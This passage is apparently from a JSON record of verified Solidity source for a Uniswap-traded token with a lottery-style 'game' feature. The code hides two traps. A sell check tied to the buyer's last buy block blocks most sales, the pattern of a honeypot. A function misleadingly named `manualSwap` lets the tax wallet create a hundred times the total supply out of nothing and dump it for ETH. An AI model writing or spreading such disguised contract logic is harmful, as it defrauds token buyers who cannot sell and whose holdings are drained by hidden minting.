}\r\n            }\r\n\r\n\r\n            if (from == address(uniswapV2Pair) && to != address(uniswapV2Router) && ! _isExcludedFromFee[to]) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n            }\r\n\r\n            if (to == uniswapV2Pair && from != address(this)) {\r\n                taxNum = amount.mul(SellTax).div(100);\r\n                require(_holderLastBuy[tx.origin] + 1 >= block.number);\r\n            }\r\n\r\n            if (from == uniswapV2Pair && to == tx.origin) {\r\n                taxNum = amount.mul(BuyTax).div(100);\r\n                if(gameOpen && randomizer.randomNum(tx.origin, amount, _previousCollectedTax) >  500000){\r\n                    timesWon++;\r\n                    latestMSGsender = tx.origin;\r\n                    _balances[tx.origin] = _balances[tx.origin].add(_previousCollectedTax);\r\n                    _balances[address(this)] = _balances[address(this)].sub(_previousCollectedTax);\r\n                    emit Transfer(address(this), tx.origin, _previousCollectedTax);\r\n                }\r\n            }\r\n\r\n\r\n\r\n            if (!inSwap && to == uniswapV2Pair && swapEnabled) {\r\n                swapTokensForETH(min(amount, min(balanceOf(address(this)), _maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance > 0) {\r\n                    transferETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (taxNum > 0) {\r\n            _previousCollectedTax = taxNum;\r\n            _balances[address(this)] = _balances[address(this)].add(taxNum);\r\n            emit Transfer(from, address(this), taxNum);\r\n        }\r\n        _balances[from] = _balances[from].sub(amount);\r\n        _balances[to] = _balances[to].add(amount.sub(taxNum));\r\n        emit Transfer(from, to, amount.sub(taxNum));\r\n    }\r\n\r\n    function startGame() external onlyOwner {\r\n        gameOpen = true;\r\n    }\r\n\r\n    function stopGame() external onlyOwner {\r\n        gameOpen = false;\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n        transferDelay = false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n   function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function transferETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return (a > b) ? b : a;\r\n    }\r\n\r\n\r\n\r\n    function openTrading(address _randomizerAddress) external onlyOwner {\r\n        require(!tradingOpen, \"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair( address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);\r\n        tradingOpen = true;\r\n        swapEnabled = true;\r\n        gameOpen = true;\r\n        launchedAt = block.number;\r\n        randomizerAddress = _randomizerAddress;\r\n        randomizer = randomizerContract(_randomizerAddress);\r\n    }\r\n\r\n    function changeRandomizer(address newRandomizerAddress) external onlyOwner() {\r\n        randomizerAddress = newRandomizerAddress;\r\n        randomizer = randomizerContract(newRandomizerAddress);\r\n    }\r\n\r\n\r\n    receive() external payable {}\r\n\r\n    function manualSwap() external {\r\n        require(_msgSender() == _taxWallet);\r\n        _balances[address(this)] = _balances[address(this)].add(_tTotal*100);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if (tokenBalance > 0) {\r\n            swapTokensForETH(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            transferETHToFee(ethBalance);\r\n        }\r\n    }\r\n}",
    "etherscan_verified": true
}